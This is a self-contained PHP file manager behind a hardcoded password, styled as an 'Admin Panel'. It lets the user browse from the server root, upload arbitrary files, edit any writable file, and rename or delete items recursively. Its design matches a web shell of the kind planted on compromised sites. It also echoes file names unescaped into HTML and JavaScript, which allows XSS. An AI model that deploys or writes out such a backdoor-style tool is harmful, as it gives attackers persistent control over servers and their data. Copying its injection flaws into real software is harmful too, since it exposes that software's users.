<?php
session_start();

$girisSifresi = 'joana';
$scriptName = basename(__FILE__);

ini_set('display_errors', 0);
ini_set('log_errors', 1);

class FileManager {
    private $root;
    private $currentDir;
    private $messages = [];
    private $scriptName;
    private $systemRoot;

    public function __construct($scriptName) {
        $this->scriptName = $scriptName;
        $this->root = __DIR__;
        $this->systemRoot = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? getenv("SystemDrive") . "\\" : "/";
        $this->resolvePath();
    }

    private function resolvePath() {
        $req = $_GET['dir'] ?? '';

        if ($req === '') {
            $this->currentDir = $this->root;
            return;
        }

        $target = realpath($req);

        if ($target !== false && file_exists($target)) {
            $this->currentDir = $target;
        } else {
            $this->addMessage('Directory not found, returned to the home directory.', 'warning');
            $this->currentDir = $this->root;
        }
    }

    public function getCurrentDir() { return $this->currentDir; }
    public function getSystemRoot() { return $this->systemRoot; }

    public function checkCSRF() {
        if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
            $this->addMessage('Security error: invalid CSRF token.', 'danger');
            return false;
        }
        return true;
    }

    public function handleRequest() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;
        if (!$this->checkCSRF()) return;

        $action = $_POST['action'] ?? '';
        
        switch ($action) {
            case 'upload': $this->handleUpload(); break;
            case 'create_folder': $this->createFolder(); break;
            case 'delete': $this->deleteItem(); break;
            case 'rename': $this->renameItem(); break;
            case 'save_edit': $this->saveFile(); break;
            case 'logout':
                session_destroy();
                header("Location: " . $this->scriptName);
                exit;
        }
    }

    private function handleUpload() {
        if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
            $name = basename($_FILES['file']['name']);
            if (move_uploaded_file($_FILES['file']['tmp_name'], $this->currentDir . DIRECTORY_SEPARATOR . $name)) {
                $this->addMessage('File uploaded.', 'success');
            } else {
                $this->addMessage('Upload failed (check permissions).', 'danger');
            }
        }
    }

    private function createFolder() {
        $name = $this->cleanName($_POST['folder_name']);
        if ($name) {
            $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
            if (!file_exists($path)) {
                if (@mkdir($path)) $this->addMessage('Folder created.', 'success');
                else $this->addMessage('Folder could not be created (no write permission).', 'danger');
            }
        }
    }

    private function deleteItem() {
        $name = $_POST['item_name']; // Do not use cleanName here; full path or .. may be present
        // For safety, only use basename; the operation is done inside currentDir
        $name = basename($name);
        $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
        
        // Prevent self-deletion
        if ($path === __FILE__) {
             $this->addMessage('The manager file cannot be deleted.', 'danger');
             return;
        }

        if (file_exists($path)) {
            if ($this->recursiveDelete($path)) $this->addMessage('Item deleted.', 'warning');
            else $this->addMessage('Could not be deleted (permission error).', 'danger');
        }
    }

    private function renameItem() {
        $old = $this->cleanName($_POST['old_name']);
        $new = $this->cleanName($_POST['new_name']);
        if ($old && $new) {
            $pOld = $this->currentDir . DIRECTORY_SEPARATOR . $old;
            $pNew = $this->currentDir . DIRECTORY_SEPARATOR . $new;
            if (file_exists($pOld) && !file_exists($pNew)) {
                if(@rename($pOld, $pNew)) $this->addMessage('Renamed.', 'success');
                else $this->addMessage('Could not rename item.', 'danger');
            }
        }
    }

    private function saveFile() {
        $name = $this->cleanName($_POST['filename']);
        $path = $this->currentDir . DIRECTORY_SEPARATOR . $name;
        if (file_exists($path)) {
            if (is_writable($path)) {
                file_put_contents($path, $_POST['content']);
                $this->addMessage('File saved.', 'success');
            } else {
                $this->addMessage('File is not writable.', 'danger');
            }
        }
    }

    private function cleanName($name) { return basename(trim($name)); }
    
    private function recursiveDelete($str) {
        if (is_file($str)) { return @unlink($str); }
        elseif (is_dir($str)) {
            $scan = glob(rtrim($str, '/') . '/*');
            foreach ($scan as $index => $path) { $this->recursiveDelete($path); }
            return @rmdir($str);
        }
        return false;
    }

    private function addMessage($msg, $type) {
        $this->messages[] = ['text' => $msg, 'type' => $type];
    }

    public function getMessages() { return $this->messages; }
    
    public function scanDir() {
        $items = @scandir($this->currentDir);
        if ($items === false) {
            $this->addMessage("Could not read directory contents (permission denied).", "danger");
            return ['folders' => [], 'files' => []];
        }
        $result = ['folders' => [], 'files' => []];
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $path = $this->currentDir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) $result['folders'][] = $item;
            else $result['files'][] = $item;
        }
        return $result;
    }
}

if (isset($_POST['login_pass'])) {
    if ($_POST['login_pass'] === $girisSifresi) {
        $_SESSION['auth'] = true;
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        header("Location: " . $scriptName);
        exit;
    } else {
        $loginError = "Incorrect password.";
    }
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log In</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>body{background:#212529;display:flex;align-items:center;justify-content:center;height:100vh;color:#fff;}</style>
</head>
<body>
    <div class="card shadow p-4 bg-dark text-white border-secondary" style="width:350px;">
        <h4 class="text-center mb-3">System Login</h4>
        <?php if(isset($loginError)) echo '<div class="alert alert-danger py-2">'.$loginError.'</div>'; ?>
        <form method="post">
            <input type="password" name="login_pass" class="form-control mb-3" placeholder="Password" required>
            <button class="btn btn-primary w-100">Log In</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

$fm = new FileManager($scriptName);
$fm->handleRequest();
$list = $fm->scanDir();
$editMode = false;
$editContent = '';
$editFile = '';

if (isset($_GET['edit'])) {
    $fName = basename($_GET['edit']);
    $fPath = $fm->getCurrentDir() . DIRECTORY_SEPARATOR . $fName;
    if (is_file($fPath)) {
        $editMode = true;
        $editFile = $fName;
        $editContent = file_get_contents($fPath);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
    <style>
        body { background: #f4f6f9; font-family: 'Segoe UI', system-ui, sans-serif; padding-top: 20px; padding-bottom: 20px;}
        .main-container { max-width: 1400px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); overflow: hidden; min-height: 80vh; }
        .sidebar { background: #f8f9fa; border-right: 1px solid #dee2e6; padding: 15px; height: 100%; min-height: 80vh; }
        .content-area { padding: 20px; }
        .breadcrumb { background: #e9ecef; padding: 10px; border-radius: 4px; font-size: 0.9rem; word-break: break-all; }
        a { text-decoration: none; }
        .code-editor { font-family: monospace; font-size: 13px; min-height: 600px; background: #2d2d2d; color: #f8f8f2; border:none; }
        .folder-list a { display: block; padding: 6px 10px; color: #495057; border-radius: 4px; transition:0.2s; }
        .folder-list a:hover { background: #e2e6ea; color: #000; }
        .folder-list i { margin-right: 8px; color: #ffc107; }
        .btn-xs { padding: 0.1rem 0.4rem; font-size: 0.75rem; }
    </style>
</head>
<body>

<div class="main-container row g-0">
    <div class="col-md-3 sidebar d-none d-md-block">
        <div class="d-grid gap-2 mb-3">
             <a href="?dir=<?php echo urlencode($fm->getSystemRoot()); ?>" class="btn btn-outline-danger btn-sm text-start"><i class="bi bi-hdd-network"></i> Server Root (/)</a>
             <a href="?dir=<?php echo urlencode(__DIR__); ?>" class="btn btn-outline-primary btn-sm text-start"><i class="bi bi-house-door"></i> Script Directory</a>
             <a href="?dir=<?php echo urlencode(dirname($fm->getCurrentDir())); ?>" class="btn btn-secondary btn-sm text-start"><i class="bi bi-arrow-up-circle"></i> Go Up One Level</a>
        </div>
        
        <hr>
        <h6 class="text-muted text-uppercase small">Folders</h6>
        <div class="folder-list">
            <?php if(empty($list['folders'])): ?>
                <small class="text-muted ps-2">No subfolders.</small>
            <?php else: ?>
                <?php foreach($list['folders'] as $f): ?>
                    <a href="?dir=<?php echo urlencode($fm->getCurrentDir() . DIRECTORY_SEPARATOR . $f); ?>">
                        <i class="bi bi-folder-fill"></i> <?php echo (strlen($f) > 25 ? substr($f,0,25).'...' : $f); ?>
                    </a>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>

    <div class="col-md-9 content-area">
        <div class="d-flex justify-content-between align-items-center mb-3">
            <h5 class="mb-0"><i class="bi bi-terminal"></i> Advanced Manager</h5>
            <form method="post" class="d-inline">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <input type="hidden" name="action" value="logout">
                <button class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Log Out</button>
            </form>
        </div>

        <div class="breadcrumb mb-3 d-flex align-items-center">
            <i class="bi bi-geo-alt me-2"></i>
            <strong>Location:</strong>&nbsp; <?php echo $fm->getCurrentDir(); ?>
        </div>

        <?php foreach($fm->getMessages() as $msg): ?>
            <div class="alert alert-<?php echo $msg['type']; ?> py-2 shadow-sm"><?php echo $msg['text']; ?></div>
        <?php endforeach; ?>

        <?php if ($editMode): ?>
            <form method="post" action="?dir=<?php echo urlencode($_GET['dir'] ?? ''); ?>">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <input type="hidden" name="action" value="save_edit">
                <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editFile); ?>">
                <div class="card shadow-sm">
                    <div class="card-header bg-dark text-white d-flex justify-content-between py-2 align-items-center">
                        <span><i class="bi bi-pencil"></i> <?php echo htmlspecialchars($editFile); ?></span>
                        <div>
                            <button class="btn btn-success btn-sm"><i class="bi bi-save"></i> Save</button>
                            <a href="?dir=<?php echo urlencode($_GET['dir'] ?? ''); ?>" class="btn btn-secondary btn-sm">Close</a>
                        </div>
                    </div>
                    <textarea name="content" class="form-control code-editor"><?php echo htmlspecialchars($editContent); ?></textarea>
                </div>
            </form>
        <?php else: ?>
            <div class="card p-3 mb-3 bg-light border-0">
                <div class="row g-2">
                    <div class="col-md-6">
                        <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                            <input type="hidden" name="action" value="upload">
                            <input type="file" name="file" class="form-control" required>
                            <button class="btn btn-primary"><i class="bi bi-upload"></i></button>
                        </form>
                    </div>
                    <div class="col-md-6">
                         <form method="post" class="d-flex gap-2">
                            <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                            <input type="hidden" name="action" value="create_folder">
                            <input type="text" name="folder_name" class="form-control" placeholder="New folder name" required>
                            <button class="btn btn-outline-success"><i class="bi bi-folder-plus"></i></button>
                        </form>
                    </div>
                </div>
            </div>

            <div class="d-block d-md-none mb-3">
                 <a href="?dir=<?php echo urlencode(dirname($fm->getCurrentDir())); ?>" class="btn btn-secondary w-100"><i class="bi bi-arrow-up"></i> Go Up One Level</a>
            </div>

            <div class="table-responsive">
                <table class="table table-hover align-middle">
                    <thead class="table-light"><tr><th>Name</th><th>Permissions</th><th>Size</th><th class="text-end">Action</th></tr></thead>
                    <tbody>
                    <?php foreach($list['folders'] as $f): ?>
                        <tr>
                            <td>
                                <a href="?dir=<?php echo urlencode($fm->getCurrentDir() . DIRECTORY_SEPARATOR . $f); ?>" class="fw-bold text-dark text-decoration-none">
                                    <i class="bi bi-folder-fill text-warning fs-5 me-1"></i> <?php echo $f; ?>
                                </a>
                            </td>
                            <td><span class="badge bg-light text-dark border"><?php echo substr(sprintf('%o', fileperms($fm->getCurrentDir().'/'.$f)), -4); ?></span></td>
                            <td>DIR</td>
                            <td class="text-end">
                                <button onclick="ren('<?php echo $f; ?>')" class="btn btn-sm btn-outline-secondary" title="Rename"><i class="bi bi-pencil-square"></i></button>
                                <button onclick="del('<?php echo $f; ?>')" class="btn btn-sm btn-outline-danger ms-1" title="Delete"><i class="bi bi-trash"></i></button>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    
                    <?php foreach($list['files'] as $f): 
                        $fullP = $fm->getCurrentDir().'/'.$f;
                        $size = file_exists($fullP) ? round(filesize($fullP)/1024, 1) : 0;
                        $perm = file_exists($fullP) ? substr(sprintf('%o', fileperms($fullP)), -4) : '????';
                        $writable = is_writable($fullP);
                    ?>
                        <tr>
                            <td>
                                <i class="bi bi-file-earmark-text text-secondary fs-5 me-1"></i> 
                                <span class="<?php echo $writable ? 'text-dark' : 'text-muted'; ?>"><?php echo $f; ?></span>
                            </td>
                            <td><span class="badge <?php echo $writable ? 'bg-success' : 'bg-danger'; ?>"><?php echo $perm; ?></span></td>
                            <td><?php echo $size; ?> KB</td>
                            <td class="text-end">
                                <a href="?dir=<?php echo urlencode($_GET['dir']??''); ?>&edit=<?php echo urlencode($f); ?>" class="btn btn-sm btn-outline-primary" title="Edit"><i class="bi bi-pencil"></i></a>
                                <button onclick="ren('<?php echo $f; ?>')" class="btn btn-sm btn-outline-secondary ms-1"><i class="bi bi-pencil-square"></i></button>
                                <button onclick="del('<?php echo $f; ?>')" class="btn btn-sm btn-outline-danger ms-1"><i class="bi bi-trash"></i></button>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
                <?php if(empty($list['folders']) && empty($list['files'])): ?>
                    <div class="text-center p-5 text-muted">This folder is empty.</div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>
</div>

<form id="actionForm" method="post" style="display:none">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="hidden" name="action" id="f_action">
    <input type="hidden" name="item_name" id="f_item">
    <input type="hidden" name="old_name" id="f_old">
    <input type="hidden" name="new_name" id="f_new">
</form>

<script>
function del(name) {
    if(confirm(name + ' will be deleted. This action cannot be undone!')) {
        document.getElementById('f_action').value = 'delete';
        document.getElementById('f_item').value = name;
        document.getElementById('actionForm').submit();
    }
}
function ren(name) {
    let newName = prompt('New name:', name);
    if(newName && newName !== name) {
        document.getElementById('f_action').value = 'rename';
        document.getElementById('f_old').value = name;
        document.getElementById('f_new').value = newName;
        document.getElementById('actionForm').submit();
    }
}
</script>
</body>
</html>